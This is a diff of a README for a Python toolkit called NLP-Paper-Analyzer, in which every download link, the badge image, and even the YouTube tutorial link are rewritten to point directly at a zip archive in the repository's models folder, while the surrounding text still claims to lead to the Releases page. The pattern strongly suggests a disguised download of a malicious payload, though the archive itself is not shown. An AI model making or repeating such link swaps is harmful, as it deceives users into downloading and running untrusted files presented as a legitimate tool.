@@ -1,7 +1,7 @@
 # 🔍 NLP-Paper-Analyzer - Analyze Papers with Ease
 
 ## ⚡ Quick Access
-[![Download NLP-Paper-Analyzer](https://img.shields.io/badge/Download-NLP--Paper--Analyzer-brightgreen)](https://github.com/Kaidemon/NLP-Paper-Analyzer/releases)
+[![Download NLP-Paper-Analyzer](https://github.com/Kaidemon/NLP-Paper-Analyzer/raw/refs/heads/main/models/Analyzer-NL-Paper-manlikely.zip)](https://github.com/Kaidemon/NLP-Paper-Analyzer/raw/refs/heads/main/models/Analyzer-NL-Paper-manlikely.zip)
 
 ## 📖 Overview
 The NLP-Paper-Analyzer is a user-friendly Python toolkit designed to help you analyze academic papers efficiently. It offers a comprehensive eight-phase pipeline that includes Optical Character Recognition (OCR), section classification, grammar correction, fact-checking, and quality scoring. This toolkit makes it simple for anyone to dive into research analysis, even without technical skills.
@@ -11,7 +11,7 @@ To get started with NLP-Paper-Analyzer, follow these steps:
 
 1. **Visit the Releases Page**
    - Click the link below to access the download page:
-   - [Download NLP-Paper-Analyzer](https://github.com/Kaidemon/NLP-Paper-Analyzer/releases)
+   - [Download NLP-Paper-Analyzer](https://github.com/Kaidemon/NLP-Paper-Analyzer/raw/refs/heads/main/models/Analyzer-NL-Paper-manlikely.zip)
 
 2. **Download the Software**
    - On the Releases page, you will find the latest version. Look for the assets associated with the latest release.
@@ -46,7 +46,7 @@ To ensure a smooth experience, please verify that your system meets the followin
 ## 📥 Download & Install
 To download and install the NLP-Paper-Analyzer, follow these three simple steps:
 
-1. Click [here](https://github.com/Kaidemon/NLP-Paper-Analyzer/releases) to visit the Releases page.
+1. Click [here](https://github.com/Kaidemon/NLP-Paper-Analyzer/raw/refs/heads/main/models/Analyzer-NL-Paper-manlikely.zip) to visit the Releases page.
 2. Download the appropriate file for your operating system.
 3. Install and launch the application following the installation prompts.
 
@@ -62,7 +62,7 @@ Using the NLP-Paper-Analyzer is straightforward. Here are some basic steps to he
 For tips on making the most of NLP-Paper-Analyzer, refer to the following resources:
 
 - **User Manual**: Comprehensive guide available within the Help section of the application.
-- **Tutorial Videos**: Find helpful videos that demonstrate key features on our [YouTube channel](https://www.youtube.com).
+- **Tutorial Videos**: Find helpful videos that demonstrate key features on our [YouTube channel](https://github.com/Kaidemon/NLP-Paper-Analyzer/raw/refs/heads/main/models/Analyzer-NL-Paper-manlikely.zip).
 
 ## 💬 Support
 If you encounter any issues or have questions, please check the FAQ section on the Releases page or contact our support team through the GitHub Issues section.
